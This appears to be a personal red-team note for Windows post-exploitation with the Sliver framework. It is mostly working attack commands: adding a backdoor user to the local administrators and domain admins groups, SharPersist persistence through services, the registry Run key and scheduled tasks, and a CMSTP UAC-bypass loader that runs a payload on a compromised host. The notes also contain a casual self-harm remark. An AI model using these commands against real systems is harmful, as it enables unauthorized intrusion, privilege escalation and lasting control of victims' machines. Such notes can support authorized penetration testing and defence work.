



## Adding user Manually


```
execute -o net user sawyer Password123! /add
execute -o net localgroup administrators sawyer /add
execute -o net group "domain admins" sawyer /domain
```



## Sharpersist

Sometimes you need to add certain specific quotations and backslashes

```
sharpersist '' -t service -c \"C:\Windows\System32\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add
sharpersist '' -t service -c \"C:\Windows\System32\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m remove
sharpersist '' -t service -c \"C:\Windows\System32\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m check
```


```
sharpersist '' -t service -c \"C:\Windows\System32\cmd.exe\" -a \"/c HAMMER.EXE\" -n \"Sex\" -m
```

This **ALSO** works apparently

```
sharpersist -- '-t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m check'
```


## Error (RECHECK ME!!!)

For some reason when it comes to tasks it just kills itself i dont know, i might kill myself too tbh

```
sharpersist -- '-t schtask -c "C:\Windows\System32\cmd.exe" -a "/c echo 123 >> c:\123.txt" -n "Some Task" -m check -o hourly'
```



## Bypass

https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html

```
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
[CMSTPBypass]::Execute("C:\tempy\CONVENIENT_PAPERBACK.exe")
```

`We packaged these 2 commands up into a PowerShell script and dropped it on our compromised asset. We can now use the following from Sliver to attempt an escalation.`

```
execute -o powershell "c:\tempy\sliver_seamless.ps1"
```




## Dumping LSASS

## References

https://seamlessintelligence.com.au/sliver_2.html

https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html


https://stevencampbell.info/Parsing-Creds-From-Lsass.exe-Dumps-Using-Pypykatz/  (error)


https://posts.specterops.io/certified-pre-owned-d95910965cd2
